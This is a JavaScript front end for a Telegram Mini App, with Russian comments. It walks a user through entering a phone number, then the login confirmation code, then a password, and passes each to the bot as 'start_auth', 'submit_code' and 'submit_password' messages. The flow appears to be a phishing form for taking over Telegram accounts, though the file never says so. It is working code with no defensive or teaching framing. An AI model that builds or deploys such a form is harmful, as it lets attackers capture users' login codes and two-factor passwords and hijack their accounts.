let tg = window.Telegram.WebApp;
tg.expand();

let currentStep = 1;
let selectedCountry = 'Россия';
let phoneNumber = '';

// Маски для разных стран
const masks = {
    'Россия': '+7 (___) ___-__-__',
    'Украина': '+380 (__) ___-__-__',
    'Казахстан': '+77 (___) ___-__-__',
    'Беларусь': '+375 (__) ___-__-__',
    'Узбекистан': '+998 (__) ___-__-__',
    'Другое': '+___________'
};

// Функция для применения маски
function applyMask(input, mask) {
    let numbers = input.value.replace(/\D/g, '');
    let result = '';
    let numIndex = 0;
    
    for (let i = 0; i < mask.length; i++) {
        if (numIndex >= numbers.length) {
            if (mask[i] === '_') {
                result += '_';
            } else {
                result += mask[i];
            }
            continue;
        }
        
        if (mask[i] === '_') {
            result += numbers[numIndex];
            numIndex++;
        } else {
            result += mask[i];
        }
    }
    
    input.value = result;
}

// Обработчик выбора страны
document.getElementById('country').addEventListener('change', function(e) {
    selectedCountry = e.target.value;
    let phoneInput = document.getElementById('phone');
    phoneInput.value = masks[selectedCountry];
    applyMask(phoneInput, masks[selectedCountry]);
});

// Обработчик ввода номера
document.getElementById('phone').addEventListener('input', function(e) {
    applyMask(e.target, masks[selectedCountry]);
});

// Получение чистого номера без маски
function getCleanPhone() {
    let phoneInput = document.getElementById('phone');
    return phoneInput.value.replace(/\D/g, '');
}

// Кнопка получения кода
document.getElementById('getCodeBtn').addEventListener('click', function() {
    let cleanPhone = getCleanPhone();
    
    if (cleanPhone.length < 10) {
        tg.showAlert('Введите корректный номер телефона');
        return;
    }
    
    showLoading(true);
    
    tg.sendData(JSON.stringify({
        action: 'start_auth',
        country: selectedCountry,
        phone: document.getElementById('phone').value
    }));
    
    setTimeout(() => {
        showLoading(false);
        showStep(2);
    }, 1500);
});

// Кнопка подтверждения кода
document.getElementById('submitCodeBtn').addEventListener('click', function() {
    let code = document.getElementById('code').value.replace(/\D/g, '');
    
    if (code.length < 4) {
        tg.showAlert('Введите код подтверждения');
        return;
    }
    
    showLoading(true);
    
    tg.sendData(JSON.stringify({
        action: 'submit_code',
        code: code
    }));
});

// Кнопка отправки пароля
document.getElementById('submitPasswordBtn').addEventListener('click', function() {
    let password = document.getElementById('password').value;
    
    if (!password) {
        tg.showAlert('Введите пароль');
        return;
    }
    
    showLoading(true);
    
    tg.sendData(JSON.stringify({
        action: 'submit_password',
        password: password
    }));
});

function showStep(step) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
}

function showLoading(show) {
    document.getElementById('loading').style.display = show ? 'block' : 'none';
    document.querySelectorAll('.step').forEach(el => {
        if (show) {
            el.style.display = 'none';
        } else {
            el.style.display = '';
        }
    });
}

// Обработка ответов от бота
tg.onEvent('mainButtonClicked', function() {
    tg.close();
});

// Инициализация
document.getElementById('phone').value = masks['Россия'];